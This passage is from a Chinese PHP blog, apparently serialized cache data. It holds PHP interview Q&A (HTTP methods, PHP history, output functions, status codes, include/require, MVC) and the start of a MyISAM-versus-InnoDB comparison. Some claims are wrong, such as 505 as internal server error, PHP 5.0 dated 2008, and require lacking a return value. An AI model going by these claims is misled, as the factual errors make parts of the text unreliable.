		<span style="font-size:14px;font-weight:normal;">get传送的数据量较小，post传送的数据量较大，一般被默认不受限制，但在理论上，IIS4中最大量为80kb，IIS5中为1000k，get安全性非常低，post安全性较高</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">GET请求会向数据库发索取数据的请求，从而来获取信息，该请求就像数据库的select操作一样，只是用来查询一下数据，不会修改、增加数据，不会影响资源的内容，即该请求不会产生副作用。无论进行多少次操作，结果都是一样的。</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">与GET不同的是，PUT请求是向服务器端发送数据的，从而改变信息，该请求就像数据库的update操作一样，用来修改数据的内容，但是不会增加数据的种类等，也就是说无论进行多少次PUT操作，其结果并没有不同。</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">POST请求同PUT请求类似，都是向服务器端发送数据的，但是该请求会改变数据的种类等资源，就像数据库的insert操作一样，会创建新的内容。几乎目前所有的提交操作都是用POST请求的。</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">DELETE请求顾名思义，就是用来删除某一个资源的，该请求就像数据库的delete操作。</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">4、PHP介绍</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">Hypertext Preprocessor----超文本预处理器</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">Personal Home Page 原始名称</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">目标用途: 允许web开发人员快速编写动态生成的web页面，与其他页面相比，PHP是将程序嵌入到HTML文档中去执行，效率比完全生成HTML编辑的CGI高很多</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">HTML: Hypertext Markup Language</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">创始人: 拉姆斯勒·勒多夫Rasmus Lerdorf，1968年生，加拿大滑铁卢大学</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">勒多夫最开始是为了维护个人网页，用prel语言写了维护程序，之后又用c进行了重写，最终衍生出php/fi</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">时间轴:</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">1995.06.08将PHP/FI公开释出</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">1995 php2.0，加入了对MySQL的支持</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">1997 php3.0</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">2000 php4.0</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">2008 php5.0</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">由于php6.0没有完全解决Unicode编码，所以基本没有生产线上的应用，基本只是一款概念产品，很多功能已经在php5.3.3和php5.3.4上实现</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">常见的IDE(Intergrated Development Environment): 集成开发环境</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">Coda（mac）</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">PHPStrom</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">Adobe Dreamweaver</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">NetBeans</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">常见文本编辑器，具备代码高亮：</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">NodePad++</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">SublimeText</span>
	</div>
</span>
		</h4>
<h4 id="section" style="font-size:14px;color:#333333;font-family:" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span style="font-weight:normal;background-color:#E53333;color:#FFFFFF;">PHP特性:</span>
		</div>
	</h4>
<h4 id="section" style="font-size:14px;color:#333333;font-family:" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span style="font-weight:normal;">php独特混合了C,Java,Prel以及PHP自创的语法</span>
	</div>
		</h4>
<h4 id="section" style="font-size:14px;color:#333333;font-family:" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span style="font-weight:normal;">可以比CGI或者Prel更快速去执行动态网页，与其他变成语言相比，PHP是讲程序嵌入到HTML文档中去执行，执行效率比完全生成HTML编辑的CGI要高很多，所有的CGI都能实现</span>
		</div>
	</h4>
<h4 id="section" style="font-size:14px;color:#333333;font-family:" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span style="font-weight:normal;">支持几乎所有流行的数据库以及操作系统</span>
	</div>
		</h4>
<h4 id="section" style="font-size:14px;color:#333333;font-family:" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span style="font-weight:normal;">PHP可以使用C,C++进行程序的扩展</span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">PHP优势:</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">开放源代码</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">免费性</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">快捷性</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">跨平台强</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">效率高</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">图形处理</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">面向对象</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">专业专注</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">PHP技术应用:</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">静态页面生成</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">数据库缓存</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">过程缓存</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">div+css w3c标准</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">大负荷</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">分布式</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">flex</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">支持MVC</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">Smarty模块引擎</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">PHP认证级别</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">初级 IFE:Index Front Engineer 前端工程师</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">中级 IPE:Index PHP Engineer PHP工程师</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">高级 IAE:Index Architecture Engineer 架构工程师</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">6、echo、print_r、print、var_dump之间的区别</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">* echo、print是php语句，var_dump和print_r是函数</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">* echo 输出一个或多个字符串，中间以逗号隔开，没有返回值是语言结构而不是真正的函数，因此不能作为表达式的一部分使用</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">* print也是php的一个关键字，有返回值 只能打印出简单类型变量的值(如int，string)，如果字符串显示成功则返回true，否则返回false * print_r 可以打印出复杂类型变量的值(如数组、对象）以列表的形式显示，并以array、object开头，但print_r输出布尔值和NULL的结果没有意义，因为都是打印"\n"，因此var_dump()函数更适合调试</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">* var_dump() 判断一个变量的类型和长度，并输出变量的数值</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">7、HTTP状态码</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">点击这儿查看HTTP状态码详解</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">常见的HTTP状态码：</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">200 - 请求成功</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">301 - 资源(网页等)被永久转义到其他URL</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">404 - 请求的资源(网页等)不存在</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">505 - 内部服务器错误</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">HTTP状态码分类:</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">1** - 信息，服务器收到的请求，需要请求者继续执行操作</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">2** - 成功，操作被成功接收并处理</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">3** - 重定向，需要进一步的操作以完成请求</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">4** - 客户端错误，请求包含语法错误或者无法完成请求</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">5** 服务器错误，服务器在处理请求的过程 中发生了错误</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">8、什么是魔术引号</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">魔术引号是一个将自动将进入PHP脚本的数据进行转义的过程，最好在编码时不要转义而在运行时根据需要而转义</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">9、如何获取客户端的ip(要求取得一个int)和服务器ip的代码</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">客户端：$_SERVER["REMOTE_ADDR"];或者getenv('REMOTE_ADDR') ip2long进行转换 服务器端：gethostbyname('www.baidu.com')</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">10、使用那些工具进行版本控制</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">cvs、svn、vss、git</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">11、优化数据库的方法</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">MySQL数据库优化的八大方式（经典必看）点击获取</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">选取最适用的字段属性，尽可能减少定义字段宽度，尽量把字段设置NOTNULL，例如'省份'、'性别'最好适用ENUM</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">使用连接(JOIN)来代替子查询</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">适用联合(UNION)来代替手动创建的临时表</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">事务处理</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">锁定表、优化事务处理</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">适用外键，优化锁定表</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">建立索引</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">优化查询语句</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">12、是否使用过模板引擎？使用的模板引擎的名字是？</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">Smarty:Smarty算是一种很老的PHP模板引擎了，它曾是我使用这门语言模板的最初选择。虽然它的更新已经不算频繁了，并且缺少新一代模板引擎所具有的部分特性，但是它仍然值得一看。</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">13、对于大流量网站，采用什么方法来解决访问量的问题</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">确认服务器硬件是否能够支持当前的流量</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">数据库读写分离，优化数据表</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">程序功能规则，禁止外部的盗链</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">控制大文件的下载</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">使用不同主机分流主要流量</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">14、语句include和require的区别是什么？为避免多次包含同一文件，可以用(?)语句代替他们</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">require是无条件包含，也就是如果一个流程里加入require，无论条件成立与否都会先执行require，当文件不存在或者无法打开的时候，会提示错误，并且会终止程序执行</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">include有返回值，而require没有(可能因为如此require的速度比include快)，如果被包含的文件不存在的化，那么会提示一个错误，但是程序会继续执行下去</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">注意:包含文件不存在或者语法错误的时候require是致命的，而include不是</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">require_once表示了只包含一次，避免了重复包含</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<span><span style="font-size:14px;"><br />
</span></span>
	</div>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">15、谈谈mvc的认识</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">由模型、视图、控制器完成的应用程序，由模型发出要实现的功能到控制器，控制器接收组织功能传递给视图</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
		<div style="text-align:left;">
			<span><span style="font-size:14px;"><br />
</span></span>
		</div>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;background-color:#E53333;color:#FFFFFF;">16、 说明php中传值与传引用的区别，并说明传值什么时候传引用？</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">变量默认总是传值赋值，那也就是说，当将一个表达式的值赋予一个变量时，整个表达式的值被赋值到目标变量，这意味着：当一个变量的赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
	<div style="text-align:left;">
		<span style="font-size:14px;font-weight:normal;">php也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的__引用__(换言之，成为了其别名或者指向)了原始变量。改动的新的变量将影响到原始变量，反之亦然。使用引用赋值，简单地将一个&amp;符号加到将要赋值的变量前(源变量)</span>
	</div>
</span>
		</h4>
<h4 id="section" style="" background-color:#ffffff;"=""><span>
		<div style="text-align:left;">
			<span style="font-size:14px;font-weight:normal;">对象默认是传引用 对于较大是的数据，传引用比较好，这样可以节省内存的开销</span>
		</div>
</span>
	</h4>
<h4 id="section" style="" background-color:#ffffff;"="">
	<div style="text-align:left;">
		<br />
	</div>
		</h4>
		<div style="text-align:left;">
			<img src="/static/admin/kindeditor/attached/image/20171222/20171222154045_54089.jpg" alt="" />
		</div>
			</blockquote>
<h4 id="section" style="" background-color:#ffffff;"="">
				</h4>
				<p style="text-align:left;">
					<br />
				</p>";s:6:"author";s:9:"赵公子";s:8:"keywords";s:12:"PHP面试题";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:76;s:5:"click";i:105;s:11:"comment_num";i:0;s:11:"description";s:49:"2017最新PHP经典面试题目汇总（上篇）";s:5:"ap_id";i:57;s:4:"path";s:20:"/upload/132thumb.png";}i:9;a:15:{s:3:"aid";i:131;s:5:"title";s:24:"myisam与innodb的区别";s:11:"create_time";i:1512453944;s:3:"cid";i:2;s:7:"content";s:3960:"<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	MyISAM与InnoDB是mysql目前比较常用的两个数据库存储引擎，MyISAM与InnoDB的主要的不同点在于性能和事务控制上。这里简单的介绍一下两者间的区别和转换方法：
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	MyISAM：MyISAM是MySQL5.5之前版本默认的数据库存储引擎。MYISAM提供高速存储和检索，以及全文搜索能力，适合数据仓库等查询频繁的应用。但不支持事务、也不支持外键。MyISAM格式的一个重要缺陷就是不能在表损坏后恢复数据。
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	InnoDB：InnoDB是MySQL5.5版本的默认数据库存储引擎，不过InnoDB已被Oracle收购，MySQL自行开发的新存储引擎Falcon将在MySQL6.0版本引进。InnoDB具有提交、回滚和崩溃恢复能力的事务安全。但是比起MyISAM存储引擎，InnoDB写的处理效率差一些并且会占用更多的磁盘空间以保留数据和索引。尽管如此，但是InnoDB包括了对事务处理和外来键的支持，这两点都是MyISAM引擎所没有的。
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	<br />
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	MyISAM适合：
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	(1)做很多count 的计算；
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	(2)插入不频繁，查询非常频繁；
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	(3)没有事务。<br />
InnoDB适合：
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	(1)可靠性要求比较高，或者要求事务；
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	(2)表更新和查询都相当的频繁，并且表锁定的机会比较大的情况。
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	(3)性能较好的服务器，比如单独的数据库服务器，像阿里云的关系型数据库RDS就推荐使用InnoDB引擎。
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	转换方法：
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	1：可直接执行：&nbsp;&nbsp;<span style="color:#666666;font-family:&quot;font-size:14px;background-color:#FFFFFF;">ALTER TABLE `yqy_product` ENGINE = MyISAM;&nbsp; 或者&nbsp;<span style="color:#666666;font-family:&quot;font-size:14px;background-color:#FFFFFF;">ALTER TABLE `<span style="color:#666666;font-family:&quot;font-size:14px;background-color:#FFFFFF;">yqy_product</span>` ENGINE = INNODB;</span>来更改指定的表引擎。</span>
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
